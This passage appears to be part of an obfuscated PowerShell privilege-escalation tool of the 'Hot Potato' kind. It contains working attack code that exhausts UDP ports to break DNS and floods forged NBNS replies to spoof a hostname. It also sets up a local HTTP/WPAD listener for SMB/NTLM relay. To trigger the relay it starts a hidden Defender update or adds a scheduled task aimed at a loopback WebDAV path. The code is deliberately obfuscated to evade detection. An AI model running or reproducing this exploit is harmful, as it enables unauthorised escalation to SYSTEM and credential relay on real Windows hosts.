                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x30,0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,
                             0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,
                             0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a +
                             ${Ht`Tp_lOC`AtIoN} +
                             0x44,0x61,0x74,0x65,0x3a +
                             ${hT`TP_`T`I`mEsTaMP} +
                             0x0d,0x0a,0x0d,0x0a
        }
        else
        {
            ${HTt`P_Re`sPOn`sE} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x20 +
                             ${T`ATER}."rESp`oNse_`S`TaT`Uscode" +
                             0x20 +
                             ${HTt`p`_r`eSPoNSE_Phr`AsE} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x31,0x30,0x37,0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,
                             0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,
                             0x2f,0x32,0x2e,0x30,0x0d,0x0a,0x44,0x61,0x74,0x65,0x3a +
                             ${HTT`p_tIME`st`AMp} +
                             0x0d,0x0a,0x0d,0x0a
        }
        
        ${Ht`Tp_StrE`AM}.("{1}{0}" -f'te','Wri').Invoke(${H`TtP_rES`P`ONSe},0,${hTt`p`_R`Es`PonsE}."len`gTH")
        ${htTP`_S`T`ReAM}.("{1}{0}"-f 'lush','F').Invoke()
        &("{1}{3}{0}{2}"-f'e','sta','p','rt-sle') -s 1
        ${T`ATEr}."rEQ`UEST_raw`URL_o`LD" = ${tAT`er}."RequeST`_`RaW`URl"
        ${TA`Ter}."hTt`p_C`LienT`_H`AnDlE`_`OlD"= ${t`A`TEr}."HtTp_`c`liEnT"."Cl`IEnt"."h`AnDlE"
    }

}

${eXhA`US`T`_uD`p_`Sc`RiPt`BlOCk} = 
{
    ${t`ATER}."exha`UST_UDP_ru`Nn`ING" = ${Tr`Ue}
    ${tA`TER}."cOn`sole`_QU`e`UE".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - Trying to exhaust UDP source ports so DNS lookups will fail "))
    ${udP_sO`CKE`T_`L`ISt} = &("{2}{0}{1}" -f 'bj','ect','New-O') ("{1}{11}{5}{4}{2}{9}{7}{8}{13}{3}{6}{12}{0}{10}" -f 'ckets.Soc','System','e','[','.Gen','tions','Ne','c.Li','s','ri','ket]','.Collec','t.So','t')
    ${udp_`F`AIl`Ed_`PO`RtS_LiSt} = &("{2}{0}{1}" -f 'ew-','Object','N') ("{2}{3}{5}{4}{1}{0}" -f't]','st[In','System.Co','llections','i','.Generic.L')
    ${I}=0

    for (${i} = 0; ${I} -le 65535; ${i}++)
    {

        try
        {

            if (${I} -ne 137 -and ${i} -ne 53)
            {
                ${i`p_e`ND`_Po`int} = &("{2}{1}{0}"-f'ct','e','New-Obj') ("{2}{0}{1}{4}{3}"-f'em.Net.I','PE','Syst','oint','ndp')(  (CHIlDiTem ("va"+"RiA"+"BLE:Bc"+"Y3O"+"S")).VaLuE::"A`NY",${I})
                ${udp_S`O`c`ket} = &("{3}{2}{1}{0}"-f 'ject','Ob','w-','Ne') ("{0}{3}{2}{1}"-f'Ne','.Socket','Sockets','t.')( (geT-VArIABlE ("fI4C"+"Q5") ).VaLUE::"INTeRNe`T`w`ork",  (geT-vaRIAble ('24h'+'1t')  -vaLuE )::"D`GrAm",  (GCI  vaRiAblE:128  ).VAlUE::"U`dp")
                ${udp`_S`OCk`Et}.("{0}{1}"-f'Bi','nd').Invoke(${ip`_EN`d_pO`INt})
                ${Udp`_s`OC`kE`T_LIst}.("{1}{0}"-f 'dd','A').Invoke(${uDP_`soC`keT})
            }

        }
        catch
        {
            ${ud`p`_fail`eD_`POrts_lIST}.("{1}{0}" -f 'dd','A').Invoke(${i});
            ${t`ATer}."cO`NS`O`Le_QUEUe".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - Couldn't bind to UDP port $i "))
        }

    }

    ${TA`TER}."u`DP_eXHAusT_`su`cc`esS" = ${FA`lse}

    while (!${Ta`TeR}."U`DP_E`XHAUst_`SuCCEsS")
    {

        if(!${S`UppRESs_f`lu`sH_M`e`sSaGE})
        {
            ${t`At`eR}."ConSO`l`E`_qu`EuE".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - Flushing DNS resolver cache "))
            ${sU`Pp`R`es`S_Fl`Ush`_MESsAGe} = ${tR`Ue}
        }

        &("{2}{1}{3}{0}" -f 'e','ResolverC','DnsFlush','ach')

        try
        {
             (  GI ('vaRIaBl'+'e'+':'+'9PI8De')  ).VALUe::("{1}{0}{3}{2}" -f 'etHo','G','try','stEn').Invoke(("{2}{3}{1}{0}"-f'oft.com','cros','m','i'))
        }
        catch
        {
            ${TA`Ter}."c`OnSoL`e_QuEue".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - DNS lookup failed so UDP exhaustion worked "))
            ${TAt`Er}."uDP_`ex`H`AUst_SUcC`Ess" = ${t`RUe}
            break
        }

        ${t`ATer}."COnSO`LE_`qUeue".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - DNS lookup succeeded so UDP exhaustion failed "))

        foreach (${UDP`_pO`Rt} in ${U`D`P_fAIleD_p`ORTS_LI`sT})
        {

            try
            {
                ${I`p_`eNd_p`oinT} = &("{1}{2}{0}" -f'ct','New-','Obje') ("{3}{1}{2}{5}{0}{4}" -f 'in','E','nd','System.Net.IP','t','po')( ( VaRIabLe ("bCY3"+"OS")  ).vaLUE::"a`Ny",${I})
                ${u`d`P_SOckET} = &("{2}{1}{0}"-f'w-Object','e','N') ("{4}{1}{3}{0}{2}{5}"-f 'ets.So','oc','ck','k','Net.S','et')(  (  ChiLDiTEm  VARIaBle:fI4Cq5  ).value::"inTeR`NEt`wO`RK", $24H1t::"dG`RAM",  $128::"u`dP")
                ${u`D`P_so`ckET}.("{0}{1}" -f'Bi','nd').Invoke(${I`P_`E`ND_poi`Nt})
                ${U`Dp_SOc`k`Et`_LiST}.("{1}{0}" -f 'd','Ad').Invoke(${UD`p_`soCKeT})
                ${Ud`p`_`FaILed_POr`TS}.("{1}{0}"-f'e','Remov').Invoke(${Udp`_P`O`Rt})
            }
            catch
            {
                ${tA`Ter}."coNs`olE_QuE`UE".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Failed to bind to $UDP_port during cleanup "))
            }

        }

    }

    ${t`At`ER}."e`xhAU`st`_UD`P_RUN`NIng" = ${fA`L`se}
}

${Sp`oOf`Er_scRIp`TB`lo`ck} = 
{
    param (${i`P},${SPOo`FE`RiP},${H`OsTNa`Me},${NBNSL`I`Mit})

    ${HOs`Tn`AMe} = ${ho`s`TNaMe}.("{2}{1}{0}"-f 'er','p','ToUp').Invoke()

    ${ho`s`TnAME_B`YtES} = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                      0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

    ${hOst`NamE`_ENCo`deD} =  ( varIABlE  mR9pQh -valUEo )::"u`TF8".("{1}{0}{2}"-f'et','G','Bytes').Invoke(${hO`S`T`NAME})
    ${Host`N`AMe_ENCoD`eD} =   $NcUZ::("{0}{2}{1}" -f'To','ng','Stri').Invoke(${hOSTnA`mE_e`Nc`OD`Ed})
    ${HOs`TnAM`E`_E`N`COdEd} = ${H`oSTn`AME_`Encod`ed}.("{0}{2}{1}" -f'Repla','e','c').Invoke("-","")
    ${Hos`TNAme_`e`NcOdEd} =   $mr9PQh::"ut`F8".("{2}{1}{0}"-f's','te','GetBy').Invoke(${h`osTNaMe`_E`NcODED})

    for (${I}=0; ${I} -lt ${HO`STname`_e`NcO`dED}."c`oUNt"; ${I}++)
    {

        if(${H`OstName_e`NCOd`eD}[${i}] -gt 64)
        {
            ${Ho`s`TnA`Me_by`TEs}[${I}] = ${host`N`Am`E_e`N`coded}[${I}] + 10
        }
        else
        {
            ${HO`sTNAmE_bY`T`es}[${I}] = ${H`o`sTna`Me_encodED}[${I}] + 17
        }

    }

    ${nbnS_`Respo`NsE_PAc`K`Et} = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            ${hOst`NAme_`By`TEs} +
                            0x00,0x20,0x00,0x01,0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]${sPO`o`FER`iP})).("{2}{1}{0}" -f's','dressByte','GetAd').Invoke() +
                            0x00,0x00,0x00,0x00
      
    while(${T`ATEr}."e`Xh`Aust_U`DP_RUn`NI`NG")
    {
        &("{2}{0}{1}{3}" -f'art-','Sle','St','ep') -s 2
    }

    ${TAT`er}."COnSO`Le_`Q`UEue".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - Flushing DNS resolver cache "))
    &("{0}{1}{2}{3}"-f 'DnsFl','ush','ResolverC','ache')

    ${taT`Er}."cON`S`oLE`_Q`UeuE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - Starting NBNS spoofer to resolve $Hostname to $SpooferIP "))
              
    ${s`e`Nd_s`oCKet} = &("{2}{0}{1}" -f'ew-O','bject','N') ("{0}{7}{6}{5}{1}{2}{4}{3}"-f'S','t.Soc','kets.','nt','UdpClie','.Ne','m','yste')(137)
    ${D`eSTi`NatioN_ip} =  (gEt-VARiable BcY3os ).VAlUE::("{1}{0}" -f'se','Par').Invoke(${I`p})
    ${d`ES`TiNat`i`on_P`oint} = &("{0}{1}{2}"-f 'New-','Ob','ject') ("{0}{1}{2}" -f 'Ne','t.IPEn','dpoint')(${DeSti`NA`TI`On_`IP},137)
    ${s`E`Nd`_sockET}.("{2}{0}{1}" -f 'nnec','t','Co').Invoke(${dESt`I`NAtIOn_P`oinT})
       
    while (${ta`TER}."RuN`N`Ing")
    {

        :NBNS_spoofer_loop while (!${TAt`er}."ho`StnAMe_sp`ooF" -and ${T`AtEr}."rUnn`I`NG")
        {

            for (${I} = 0; ${i} -lt 255; ${i}++)
            {

                for (${J} = 0; ${J} -lt 255; ${J}++)
                {
                    ${NBns`_r`E`sPo`Nse_`PaCkET}[0] = ${i}
                    ${nbns`_Re`s`P`oNsE`_PA`cket}[1] = ${j}                 
                    ${sENd`_`so`cKet}.("{1}{0}"-f 'd','Sen').Invoke(${nbNs`_`R`ESPOnSe_p`ACket},${N`BnS_r`esP`o`NsE_`P`ACKEt}."lEN`G`Th")

                    if(${t`ATEr}."HO`ST`NaME_`sp`OOf" -and ${NbNsl`IM`IT} -eq 'Y')
                    {
                        break ("{3}{5}{0}{4}{1}{2}" -f 'NS_sp','r_l','oop','N','oofe','B')
                    }

                }

            }

        }

        &("{1}{0}{2}" -f'tart-Slee','S','p') -m 5
    }

    ${s`eN`D_SoCK`et}.("{0}{1}" -f'Clos','e').Invoke()
 }

${T`AT`Er_S`Cr`ipTBlOCK} = 
{
    param (${N`BNs},${Nb`N`sLIm`it},${RU`NTimE},${S`Po`OfERIp},${H`os`TName},${HT`TpPO`RT})
    
    if(${rU`Nt`imE})
    {    
        ${Tat`Er_t`I`mEOuT} = &("{2}{1}{3}{0}"-f 'span','w-t','ne','ime') -Minutes ${R`UnTiME}
        ${TA`Ter`_sTOpWa`T`CH} =   (  CHILDiTem  ('V'+'a'+'rI'+'ABlE:2FY') ).VaLUe::("{2}{0}{1}"-f 'tartNe','w','S').Invoke()
    }

    while (${TA`TER}."RU`N`NInG")
    {

        if(${taT`Er}."Tri`g`GeR" -ne 2)
        {

            try
            {
                ${HOS`TNaME`_`IP} =  $9pi8dE::("{2}{0}{1}{3}" -f'etHo','stEntr','G','y').Invoke(${h`OStN`AmE})."a`D`drEsslIST"[0]."IPaDD`R`E`SSTOStR`i`NG"
            }
            catch
            {
                
            }
            
            if(${h`oSTnA`me_iP} -eq ${Sp`OOFE`R`IP})
            {

                if(!${su`ppReSS`_sPoOf`e`d_MEs`SA`Ge})
                {
                    ${T`AtEr}."C`ONsOL`e_QUEUe".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - $Hostname has been spoofed to $SpooferIP "))
                    ${s`Up`PRESS_`SPoo`FEd_MesSAGE} = ${TR`UE}
                }

                if(${nb`N`slimiT} -eq 'Y')
                {
                    ${T`At`Er}."HOSt`N`A`ME_sPOof" = ${tr`UE}
                }

                ${Hostn`AM`e_s`po`Of} = ${T`Rue}
                ${H`o`st`NamE_IP} = ""
            }
            elseif((!${hO`STN`Am`e_iP} -or ${ho`S`Tn`AMe_iP} -ne ${S`pOo`Fe`RIP}) -and ${N`BnS} -eq 'Y')
            {
                ${ta`TER}."HOSt`N`AMe_`S`POof" = ${F`AL`SE}
                ${hoStn`AMe_`sp`Oof} = ${FA`L`sE}
            }

        }

        if(!${T`ATeR}."sM`BREL`Ay_Su`CcE`Ss" -and ${T`AtEr}."trIg`G`er" -eq 1)
        {

            if(&("{1}{0}{2}"-f's','Te','t-Path') ((("{7}{6}{8}{3}{1}{5}{2}{4}{0}" -f'CmdRun.exe','s','lM','am FilesWSlWindow','p',' DefenderWS',':WSlP','C','rogr'))  -CrEPlAcE  'WSl',[char]92))
            {

                if((${pro`CE`sS_`d`EF`eNDER}."H`ASE`XIt`ED" -or !${pR`o`C`ESs_defEnDeR}) -and !${T`AT`ER}."S`M`B_rElAY_Su`C`CeSS" -and ${H`o`sTNaME_sP`oOf})
                {
                    ${T`At`er}."CoNsO`Le`_que`UE".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - Running Windows Defender signature update "))
                    ${P`Rocess`_`De`FeNDer} = &("{3}{1}{0}{2}" -f'ces','art-Pro','s','St') -FilePath ((("{11}{0}{14}{10}{13}{5}{2}{1}{9}{6}{3}{7}{4}{12}{8}"-f '5','ind','Iv5W','efende','un.','s','D','rIv5MpCmdR','e','ows ','gr','C:Iv','ex','am File','Pro'))."rePl`A`ce"(([chAr]73+[chAr]118+[chAr]53),[sTRinG][chAr]92)) -Argument ("{0}{2}{1}{4}{3}" -f'Sig','atureUp','n','te','da') -WindowStyle ("{2}{1}{0}"-f 'dden','i','H') -passthru
                }

            }
            else
            {
                ${ta`T`eR}."co`NS`O`LE_qUE`Ue".("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{4}{0}{2}" -f'er not fou','indows D','nd','W','efend'))
            }

        }
        elseif(!${T`A`TeR}."S`m`Bre`lAY_S`UC`CeSs" -and ${Tat`ER}."TRIGg`Er" -eq 2)
        {
            ${sER`V`iCE_Web`C`lieNt} = &("{0}{2}{1}"-f'Get','ice','-Serv') ("{2}{0}{1}"-f'n','t','WebClie')

            if(${SeR`Vice`_WEB`cliE`Nt}."STA`Tus" -eq ("{2}{1}{0}" -f 'd','toppe','S'))
            {
                ${T`AtEr}."c`o`NsOle_qU`eUe".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Starting WebClient service "))
                &("{0}{1}{2}" -f'Star','t-Pro','cess') -FilePath ("{1}{0}{2}"-f 'd.e','cm','xe') -Argument ((("{8}{7}{5}{0}{4}{9}{1}{2}{6}{3}" -f 'li','nte','r','ools','ve.sy','d U05U05','nals.comU05t','sh','/C pu','si'))-CreplacE  'U05',[chaR]92) -WindowStyle ("{1}{0}" -f'dden','Hi') -passthru -Wait
            }

            if(${s`e`RvICE_web`cli`E`Nt}."STat`Us" -eq ("{1}{0}{2}" -f'in','Runn','g') -and !${t`AtEr}."t`ASk_ad`DEd" -and !${Tat`er}."S`M`B`RELAY_Succ`ess")
            {
                ${Ti`ME`s`TamP_aDD} = (&("{2}{1}{0}"-f 'ate','-D','Get')).("{0}{3}{1}{2}" -f 'A','e','s','ddMinut').Invoke(1)
                ${timESTam`P_`AdD`_sT`RiNg} = ${TI`M`EStaMP_`ADd}.("{2}{1}{0}"-f 'ring','St','To').Invoke(("{1}{0}"-f':mm','HH'))
                ${t`ATEr}."TA`Sk" = ${tA`T`eR}."TasK`N`AMe"
                
                if(${tA`TER}."t`Ask_de`leTE")
                {
                    ${TA`Ter}."T`ASk" += "_"
                    ${Tat`eR}."tA`sk" += &("{0}{2}{1}" -f'Ge','-Random','t')   
                }

                ${tAt`eR}."ConS`Ole_QUe`UE".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - Adding scheduled task  ") + ${ta`TEr}."t`ASk")
                ${pR`OCesS_sCh`edUlED_`Ta`Sk} = ("{2}{5}{1}{0}{3}{4}" -f'.exe /C','s','/C sc','re','ate /TN ','htask') + ${T`AteR}."tA`SK" + (' '+'/T'+'R '+' '+"\\127.0.0.1@$HTTPPort\test "+'/'+'SC '+'O'+'NCE '+'/S'+'T '+"$timestamp_add_string "+'/F')
                &("{2}{0}{3}{1}"-f 'roc','ss','Start-P','e') -FilePath ("{0}{1}{2}" -f'cmd','.e','xe') -Argument ${ProceS`S`_sChe`duL`eD_tASK} -WindowStyle ("{0}{1}{2}" -f'Hid','de','n') -passthru -Wait
                
                ${sc`hedu`le_`se`RViCe} = &("{0}{1}{2}" -f 'ne','w-obj','ect') -com(("{2}{3}{1}{0}"-f'ice','ule.Serv','Sc','hed'))
                ${s`cheD`UL`e_serVICe}.("{1}{2}{0}"-f 'nect','c','on').Invoke() 
                ${S`Ch`EDulED_`Ta`S`k_LIST} = ${sCH`EDULe_S`e`Rv`I`cE}.("{0}{2}{1}" -f'getf','lder','o').Invoke("\").("{1}{0}"-f'tasks','get').Invoke(1)

                ${TAT`er}."TaS`k_ADD`ED" = ${F`ALsE}

                foreach(${S`cHEDu`LEd_t`AsK} in ${Sc`HEDul`ED`_`TaSK_Li`st})
                {

                    if(${sCh`ED`Uled_task}."N`AmE" -eq ${T`A`TeR}."TA`sK")
                    {
                        ${tat`ER}."taSk_a`D`DEd" = ${Tr`UE}
                    }
                
                }

                ${Sch`E`D`Ul`e_sEr`VICE}.("{1}{0}" -f 't','Qui').Invoke()

                if(!${ta`T`eR}."Ta`sK_A`ddEd" -and !${ta`TEr}."SmbRELA`y`_Su`CC`ess")
                {
                    ${tat`er}."Co`NSOLe`_`que`Ue".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Adding scheduled task  ") + ${T`AT`Er}."ta`sk" + ("{0}{1}" -f ' f','ailed'))
                    &("{0}{2}{1}"-f 'StopTa','er','t')
                }

            }
            elseif(${T`ATer}."t`ASK_AD`Ded" -and (&("{1}{0}{2}" -f 'et-Dat','G','e')) -ge ${TImE`sTa`m`p_adD}.("{0}{1}{3}{2}" -f 'A','d','es','dMinut').Invoke(2))
            {
                ${Ta`T`ER}."CO`N`SolE`_qUEUe".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - Something went wrong with the service "))
                &("{0}{1}" -f 'StopTa','ter')
            }

        }

        if(${ta`T`er}."s`mBrE`LaY_S`Ucc`ess")
        {
            &("{3}{1}{0}{2}"-f '-Pro','op','cess','St') -id ${p`Ro`cesS`_DE`FEn`dER}."iD"
        }

        if(${R`Unti`ME})
        {

            if(${tAtE`R_sTOpW`A`TcH}."ElAP`s`ED" -ge ${T`AT`ER_tiM`e`out})
            {
                &("{0}{2}{1}" -f 'Sto','er','pTat')
            }
        
        } 
           
        &("{3}{1}{2}{0}" -f 'Sleep','r','t-','Sta') -m 5
    }

 }


function HttP`l`iSTe`Ner()
{

    if(${wPaD`p`ORT} -eq '80')
    {
        ${tA`Ter}."h`T`Tp_`ENDP`oINt" = &("{2}{0}{1}" -f'w-O','bject','Ne') ("{0}{1}{6}{2}{3}{5}{4}"-f 'Sy','stem.','.IPEn','dPoi','t','n','Net')(  ( VARIaBlE ('Bcy3'+'oS')  -valueOnL)::"LoOp`BAcK",${H`TTppORt})
    }
    else
    {
        ${ta`Ter}."htT`P`_ENDpOInt" = &("{1}{0}{2}"-f 'ew-','N','Object') ("{4}{3}{1}{2}{0}" -f'int','st','em.Net.IPEndPo','y','S')(  ( gcI  ('VARIa'+'B'+'LE:'+'BC'+'y3OS')).vaLue::"A`Ny",${HttPpO`RT})
    }

    ${tA`T`er}."h`Ttp_li`steN`Er" = &("{0}{1}{2}"-f 'New','-Objec','t') ("{4}{3}{2}{0}{1}{5}" -f'kets.T','cpListene','et.Soc','tem.N','Sys','r') ${tA`TER}."htTp_`EnDP`oInt"
    ${ta`TEr}."H`TTP_Li`Ste`NEr".("{1}{0}" -f 'tart','S').Invoke()
    ${hTTP_`RUnS`pA`Ce} =   $k7AcV::("{1}{0}{2}{3}" -f 'teRu','Crea','nspac','e').Invoke()
    ${Ht`Tp`_`RUnSp`ACe}.("{1}{0}" -f 'pen','O').Invoke()
    ${HtT`p`_r`UNspaCE}."SES`si`oNs`TATEpro`XY".("{1}{0}{2}"-f'iabl','SetVar','e').Invoke(("{0}{1}"-f 'tat','er'),${TaT`ER})
    ${hTt`P_POw`ers`HE`LL} =   ( vaRIABle ("i"+"JV")).vAluE::("{1}{0}" -f'te','Crea').Invoke()
    ${hTtP_POw`erSH`E`Ll}."rUN`sp`AcE" = ${Ht`T`p_`RU`NspACE}
    ${hTtp_`pOWE`RS`hEll}.("{2}{1}{3}{0}"-f'ript','dd','A','Sc').Invoke(${sHA`ReD_bAsiC_FuNcT`i`OnS_`SCRIPtbL`o`CK}) > ${N`ULl}
    ${H`T`Tp_`pO`wErSHEll}.("{2}{1}{0}" -f 'Script','d','Ad').Invoke(${sMB_`ReL`AY_`c`HAlleN`GE_ScRIP`TBLoCK}) > ${N`UlL}
    ${http_`pOwersH`e`ll}.("{1}{0}{2}"-f'i','AddScr','pt').Invoke(${SMB_rEL`AY_r`eSPOn`s`E`_S`cRiPtB`l`OcK}) > ${n`UlL}
    ${HTTp_poWE`RS`HE`lL}.("{1}{2}{0}"-f 'ript','AddS','c').Invoke(${S`Mb_reLAY_`EXEcUt`e_S`cRIptB`lOCk}) > ${N`Ull}
    ${h`Ttp_pow`Er`Shell}.("{3}{1}{2}{0}"-f'ipt','S','cr','Add').Invoke(${sMB_ntl`m`_Fu`N`cTiON`S_s`CrIPTbl`OcK}) > ${n`Ull}
    ${h`Ttp_`p`oWERSHEll}.("{0}{1}{2}" -f'Add','S','cript').Invoke(${h`TT`p_S`CrI`ptBl`OCk}).("{1}{0}{2}"-f'Ar','Add','gument').Invoke(${COm`m`AnD}).("{2}{1}{0}"-f'ument','ddArg','A').Invoke(${H`TTP`Port}).("{1}{2}{0}{3}"-f'rgume','Add','A','nt').Invoke(
                               ${wpA`d`diRE`CT`hosTS}).("{1}{0}{2}{3}" -f'd','Ad','Arg','ument').Invoke(${Wp`A`DpOrT}) > ${nU`lL}
    ${hTTP`_POWeR`sh`elL}.("{0}{1}{2}" -f 'Beg','in','Invoke').Invoke() > ${Nu`lL}
}


function E`xH`AUs`TuDP()
{
    ${exh`Aus`T`_uDP_RUnSpa`cE} =   ( vaRIAble k7aCv -ValuEO  )::("{0}{1}{2}" -f'Cr','eat','eRunspace').Invoke()
    ${eX`H`AUST_`Ud`P_R`U`NSpACE}.("{1}{0}" -f'n','Ope').Invoke()
    ${E`XHAUst_U`DP`_R`Unsp`Ace}."SEsSIo`NsTatEp`R`o`XY".("{0}{1}{3}{2}"-f 'Set','V','riable','a').Invoke(("{0}{1}"-f 'tat','er'),${tA`TeR})
    ${E`xha`U`sT_`UdP_`POWerS`hEll} =  (  GEt-vARIABlE IJv -VaLuE)::("{0}{1}"-f'Crea','te').Invoke()
    ${exh`AusT`_u`dp_P`oWeRSh`ElL}."Ru`NS`PACe" = ${e`xhauST`_UDP`_rUN`spaCe}
    ${ex`H`AUSt_UD`p_`POWERS`helL}.("{2}{0}{1}"-f 'ddSc','ript','A').Invoke(${Sh`A`R`ed`_b`A`SI`c_f`U`NcTioNS_sCRIPtb`lOcK}) > ${nU`lL}
    ${e`x`hau`s`T_Udp_P`OweR`s`heLl}.("{0}{1}{2}"-f 'Ad','dScri','pt').Invoke(${E`xhauS`T_UDP`_`Scri`PTBlO`ck}) > ${NU`lL}
    ${eXHAuS`T`_U`dp_pOwErs`hE`lL}.("{3}{0}{1}{2}" -f'egi','nIn','voke','B').Invoke() > ${nu`lL}
}


function Spo`o`Fer()
{
    ${s`poOFeR_`RuN`sP`A`CE} =  (gET-CHIldITEM VARIAbLe:K7Acv  ).vAlue::("{2}{0}{1}{3}{4}"-f'a','te','Cre','R','unspace').Invoke()
    ${Sp`O`OF`eR_rU`N`SPAcE}.("{1}{0}"-f'en','Op').Invoke()
    ${SP`oof`eR_RU`NsPaCE}."Sess`I`OnstA`TE`pROXY".("{1}{2}{3}{0}"-f'le','SetVa','r','iab').Invoke(("{0}{1}"-f 'tat','er'),${T`At`eR})
    ${SpoOF`ER`_P`OWerS`He`lL} =   (  LS  VARIabLE:iJV ).VALUe::("{0}{2}{1}"-f 'Cr','e','eat').Invoke()
    ${SpOOF`ER`_pOW`ErsH`ElL}."RuNS`pa`CE" = ${SP`OOFeR_run`S`p`ACe}
    ${sP`oOFEr`_`pOweRSHe`ll}.("{2}{1}{0}" -f'ript','ddSc','A').Invoke(${SHAREd`_ba`s`Ic_FU`NcTio`NS_`SCriptb`LOCk}) > ${Nu`lL}
    ${s`pOofER_`pOw`E`RSHElL}.("{1}{3}{2}{0}" -f 'pt','A','i','ddScr').Invoke(${SM`B`_nTl`M_fuNcTIO`NS_sCrI`PtBLocK}) > ${N`UlL}
    ${S`PoofER_`POWeR`sh`ELl}.("{2}{1}{0}"-f't','rip','AddSc').Invoke(${SpO`O`F`Er`_Scr`ipTBL`OCK}).("{2}{1}{0}"-f'ent','dArgum','Ad').Invoke(${ip}).("{0}{1}{2}" -f 'AddArgum','e','nt').Invoke(${Spo`OFEr`IP}).("{1}{0}{2}"-f'u','AddArg','ment').Invoke(
                                  ${H`o`StName}).("{0}{2}{1}" -f'Ad','nt','dArgume').Invoke(${NbNS`lIM`It}) > ${Nu`ll}
    ${SP`oofER_p`oweRs`hELl}.("{2}{0}{1}" -f'g','inInvoke','Be').Invoke() > ${N`Ull}
}


function tA`T`e`RLooP()
{
    ${Tat`er_r`UN`SpAce} =  (  gEt-vAriaBLE k7AcV  -vALUe  )::("{1}{2}{0}{3}{4}"-f 'teRun','Cre','a','spac','e').Invoke()
    ${taTeR`_`RuNS`Pace}.("{0}{1}"-f 'O','pen').Invoke()
    ${TAtER_R`Un`spAcE}."S`EsSiOn`stATEpRo`xY".("{1}{0}{2}"-f'ariabl','SetV','e').Invoke(("{0}{1}"-f'ta','ter'),${Ta`Ter})
    ${T`ATEr_Po`W`ER`sHell} =   ( diR  ('VA'+'rIAB'+'L'+'e:ijV') ).vALue::("{1}{0}"-f 'e','Creat').Invoke()
    ${tA`T`eR_PoWeRs`h`e`Ll}."runS`p`AcE" = ${TATe`R_RUn`SP`A`CE}
    ${T`AtE`R_POW`ershell}.("{3}{0}{2}{1}"-f'cri','t','p','AddS').Invoke(${s`HAr`E`d_`BASi`c_fUNCtIoN`S_`Scr`IpTbl`O`CK}) > ${nU`lL}
    ${TATEr_P`o`wer`s`HelL}.("{2}{0}{1}"-f 'dSc','ript','Ad').Invoke(${TaT`eR_scr`Ip`TBlOCk}).("{1}{3}{2}{0}" -f 't','Ad','n','dArgume').Invoke(${nB`Ns}).("{3}{2}{0}{1}"-f'umen','t','rg','AddA').Invoke(${N`B`NsLIMIt}).("{0}{2}{1}" -f'Add','ment','Argu').Invoke(
                                ${Ru`N`TIme}).("{2}{0}{1}"-f 'n','t','AddArgume').Invoke(${SpO`O`F`eRiP}).("{0}{1}{2}"-f 'AddArg','um','ent').Invoke(${h`oStNA`ME}).("{3}{1}{0}{2}"-f 'u','dArg','ment','Ad').Invoke(
                                ${HT`TPP`ort}) > ${n`ULL}
    ${tAtER_POw`Ers`h`e`LL}.("{0}{3}{2}{1}"-f 'Begi','oke','nv','nI').Invoke() > ${NU`LL}
}


&("{2}{1}{3}{0}" -f'r','TTPListe','H','ne')


if(${e`X`h`AUStudP} -eq 'Y')
{
    &("{1}{3}{0}{2}" -f'UD','E','P','xhaust')
}


if(${nB`Ns} -eq 'Y')
{
    &("{1}{2}{0}"-f'ofer','S','po')
}


&("{1}{0}{2}"-f'er','Tat','Loop')

if(${T`A`TER}."Co`N`S`OlE_`oUtput")
{

    :console_loop while(${tAt`eR}."ruNN`iNG" -and ${t`ATER}."c`o`Ns`oLE`_ouTPut")
    {

        while(${t`A`Ter}."c`oN`sOle`_Q`UEUE"."c`OUnt" -gt 0)
        {
            &("{1}{2}{0}" -f 't','Write-Outp','u')(${TA`Ter}."conSo`lE`_Que`UE"[0] + ${Ta`TER}."N`eWl`InE")
            ${Tat`ER}."co`NSole_q`U`e`Ue".("{1}{2}{0}"-f'nge','R','emoveRa').Invoke(0,1)
        }

        if(${TA`Ter}."CONsO`Le_`I`N`PUt")
        {

            if(  (  gET-childItEM ("VARIAb"+"Le"+":"+"Gwt") ).valuE::"k`Ey`AvaILaBlE")
            {
                ${t`AtEr}."C`ONSoLE`_OUtPUT" = ${F`AL`SE}
                BREAK ("{2}{3}{0}{1}"-f 'o','p','co','nsole_lo')
            }

        }

        &("{0}{1}{2}"-f'Sta','rt-S','leep') -m 5
    }

    if(!${T`A`TeR}."Runn`inG")
    {
